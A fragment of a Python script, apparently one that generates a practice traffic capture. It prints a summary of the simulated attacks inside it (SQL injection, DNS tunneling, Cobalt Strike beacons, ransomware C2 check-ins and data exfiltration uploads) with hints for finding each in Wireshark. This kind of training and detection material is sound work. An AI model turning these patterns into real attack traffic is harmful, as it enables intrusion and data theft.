print(f"    - SQL Injection (Port 80): UNION, OR, DROP statements")
print(f"    - DNS Tunneling (Port 53): Suspicious TLDs (.tk, .ml, .ga)")
print(f"    - Cobalt Strike (Port 443): C2 beacon patterns")
print(f"    - Ransomware C2 (Port 443): Victim checkins with BTC addresses")
print(f"    - Data Exfiltration (Port 80): File uploads with Content-Disposition")
print(f"\n[*] Use Wireshark or tshark to analyze the traffic patterns")
print(f"[*] Each attack has UNIQUE and DISTINCT signatures!")
print(f"{'='*70}\n")
